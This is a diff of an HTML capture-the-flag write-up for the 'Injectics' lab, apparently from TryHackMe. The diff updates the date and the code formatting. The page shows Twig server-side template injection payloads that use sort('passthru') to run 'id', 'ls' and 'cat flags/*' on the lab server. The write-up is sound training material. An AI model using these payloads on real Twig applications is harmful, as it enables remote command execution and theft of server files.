@@ -111,7 +111,7 @@
 </nav>
 <header id="title-block-header">
 <h1 class="title">Injectics</h1>
-<p class="date"><i class="fa-solid fa-calendar"></i> Creation date:<span style='opacity:0;'>_</span>13.08.2024</p>
+<p class="date"><i class="fa-solid fa-calendar"></i> Creation date:<span style='opacity:0;'>_</span>26.08.2024</p>
 </header>
 <nav id="TOC" role="doc-toc">
 <ul>
@@ -326,14 +326,14 @@ dev@injectics.thm</code></pre>
 <p>And here it is!</p>
 <h2 data-number="4.2" id="server-side-template-injection"><span class="header-section-number">4.2</span> Server-Side Template Injection</h2>
 <p>In the <a href="#composerjson">composer.json</a> file, we discovered that this app uses <a href="https://twig.symfony.com/">twig</a> (a template engine), so we can try <strong>Server-Side Template Injection</strong>. We will inject malicious code into a template, which will be executed on the server. More about SSTI <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">here</a>. Let’s go back to Profile page, and test our idea using payload below:</p>
-<pre><code>{{7*7}}</code></pre>
+<div class="sourceCode" id="cb9"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true"></a>{{<span class="dv">7</span>*<span class="dv">7</span>}}</span></code></pre></div>
 <p><img src="images/SSTI%20test.png" alt="SSTI test" /> As we can see our payload was processed. Now let’s try something more exciting. If you check the THM page our goal is to read content of <strong>flags</strong> directory. In order to find payload which works you can use this <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig">PayloadsAllTheThings</a> repository.</p>
 <p>If we combine some payloads listed in the repo, we’ve got this:</p>
-<pre><code>{{[&#39;id&#39;,&#39;&#39;]|sort(&#39;passthru&#39;)}}</code></pre>
+<div class="sourceCode" id="cb10"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true"></a>{{<span class="ot">[</span><span class="st">&#39;id&#39;</span><span class="ot">,</span><span class="st">&#39;&#39;</span><span class="ot">]</span>|<span class="fu">sort</span><span class="ot">(</span><span class="st">&#39;passthru&#39;</span><span class="ot">)</span>}}</span></code></pre></div>
 <p>Passing it into the form will result in this welcome message. <img src="images/SSTI1.png" alt="Testing payload" /> Now that we have PoC, we can search for flags directory.</p>
-<pre><code>{{[&#39;ls&#39;,&#39;&#39;]|sort(&#39;passthru&#39;)}}</code></pre>
+<div class="sourceCode" id="cb11"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true"></a>{{<span class="ot">[</span><span class="st">&#39;ls&#39;</span><span class="ot">,</span><span class="st">&#39;&#39;</span><span class="ot">]</span>|<span class="fu">sort</span><span class="ot">(</span><span class="st">&#39;passthru&#39;</span><span class="ot">)</span>}}</span></code></pre></div>
 <p><img src="images/SSTI2.png" alt="Listing content of the root folder" /> As we can see there is our flags directory, so let’s read everything inside this directory.</p>
-<pre><code>{{[&#39;cat flags/*&#39;,&#39;&#39;]|sort(&#39;passthru&#39;)}}</code></pre>
+<div class="sourceCode" id="cb12"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true"></a>{{<span class="ot">[</span><span class="st">&#39;cat flags/*&#39;</span><span class="ot">,</span><span class="st">&#39;&#39;</span><span class="ot">]</span>|<span class="fu">sort</span><span class="ot">(</span><span class="st">&#39;passthru&#39;</span><span class="ot">)</span>}}</span></code></pre></div>
 <p><img src="images/Final%20flag.png" alt="Final flag" /> And there is our last flag.</p>
 </body>
 </html>
